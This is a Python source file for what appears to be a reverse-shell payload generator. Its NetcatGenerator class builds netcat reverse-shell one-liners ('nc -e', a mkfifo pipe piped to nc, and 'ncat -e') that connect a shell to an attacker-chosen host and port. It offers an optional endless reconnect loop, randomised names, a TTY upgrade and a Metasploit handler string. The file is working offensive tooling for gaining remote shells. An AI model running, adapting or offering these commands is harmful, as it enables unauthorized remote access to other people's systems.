import random
from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler, LISTENER_FMT, build_listener_setup

_VARIANTS = ["dash_e", "mkfifo", "ncat"]


class NetcatGenerator(ShellGenerator):
    language = "netcat"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)
        if variant == "dash_e":
            cmd = self._dash_e(opts, names)
        elif variant == "mkfifo":
            cmd = self._mkfifo(opts, names)
        else:
            cmd = self._ncat(opts, names)

        if opts.retry:
            cmd = f"while :; do {cmd}; sleep 30; done"

        return ShellResult(
            command=cmd, variant=variant, language=self.language, arch=opts.arch,
            listener=LISTENER_FMT.format(lport=opts.lport),
            tty_upgrade=TTY_UPGRADE,
            msf_compat=msf_handler("payload/cmd/unix/reverse_netcat", opts.lhost, opts.lport),
            listener_setup=build_listener_setup(opts.lhost, opts.lport),
        )

    def _dash_e(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        shell = random.choice(["/bin/bash", "/bin/sh"]) if names else "/bin/sh"
        return f"nc -e {shell} {opts.lhost} {opts.lport}"

    def _mkfifo(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        pipe = self._var("f", names)
        shell = random.choice(["/bin/bash", "/bin/sh"]) if names else "/bin/bash"
        return (
            f"rm -f /tmp/{pipe}; mkfifo /tmp/{pipe}; "
            f"{shell} -i < /tmp/{pipe} 2>&1 | nc {opts.lhost} {opts.lport} > /tmp/{pipe}"
        )

    def _ncat(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        shell = random.choice(["/bin/bash", "/bin/sh"]) if names else "/bin/sh"
        return f"ncat {opts.lhost} {opts.lport} -e {shell}"
